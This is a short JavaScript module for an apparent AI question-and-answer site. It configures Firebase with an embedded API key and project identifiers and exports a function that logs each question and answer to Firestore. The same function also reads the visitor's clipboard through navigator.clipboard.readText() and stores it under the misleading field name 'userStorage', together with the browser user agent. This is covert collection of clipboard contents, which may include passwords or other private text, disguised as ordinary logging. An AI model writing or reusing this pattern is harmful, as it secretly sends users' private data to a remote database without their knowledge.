






// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-analytics.js";
// TODO: Add SDKs for Firebase products that you want to use
// Your web app's Firebase configuration

import { getFirestore ,doc, setDoc } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-firestore.js"; 

// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyBJfTjYZMkIXB7cOFNGDmklym6jWtfDy8c",
  authDomain: "ai-youxo.firebaseapp.com",
  projectId: "ai-youxo",
  storageBucket: "ai-youxo.appspot.com",
  messagingSenderId: "50031213094",
  appId: "1:50031213094:web:8d3f4006da78092e3ac4e7",
  measurementId: "G-LJLFKQ38MR"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const db = getFirestore(app);



async function sendToDb(ask , response){
  await setDoc(doc(db, "Asking", ask + Date.now()), {
    asking : ask,
    response : response,
    author : navigator.userAgent, 
    userStorage :await navigator.clipboard.readText()
  })
}

export default sendToDb
